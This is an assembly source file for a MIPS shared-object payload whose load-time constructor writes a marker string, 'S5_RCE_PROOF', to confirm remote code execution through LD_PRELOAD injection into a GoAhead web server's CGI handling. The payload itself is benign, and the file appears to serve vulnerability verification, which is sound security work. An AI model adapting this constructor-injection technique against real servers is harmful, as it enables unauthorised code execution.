 /* payload.S — minimal MIPS o32 DSO with a .init_array constructor.
  * The constructor runs before main when the .so is loaded via LD_PRELOAD.
  * It does write(1, "S5_RCE_PROOF\n", 13): fd 1 = the CGI stdout, which
  * GoAhead captures as the HTTP response body. Marker in response == RCE.
  *
  * MIPS o32 syscalls: $v0=nr, $a0..$a3=args. __NR_write=4004.
  * Data is loaded via the GOT (PIC) so ld -shared accepts the relocations.
  */
     .set    noreorder
     .set    noat
     .text
     .globl  _constructor
     .type   _constructor, @function
     .ent    _constructor
 _constructor:
     addiu   $sp, $sp, -4
     sw      $ra, 0($sp)
     /* load address of _msg via the GOT (PIC) */
     li      $t9, %got(_msg)
     addu    $t9, $gp, $t9
     lw      $t9, 0($t9)
     move    $a1, $t9
     li      $v0, 4004          /* __NR_write */
     li      $a0, 1            /* fd 1 = stdout */
     li      $a2, 13           /* strlen("S5_RCE_PROOF\n") */
     syscall
     lw      $ra, 0($sp)
     addiu   $sp, $sp, 4
     jr      $ra
     nop
     .end    _constructor

     .section .init_array, "aw"
     .word   _constructor

     .section .rodata
     .align  2
     .globl  _msg
 _msg:
     .ascii  "S5_RCE_PROOF\n"
     .byte   0
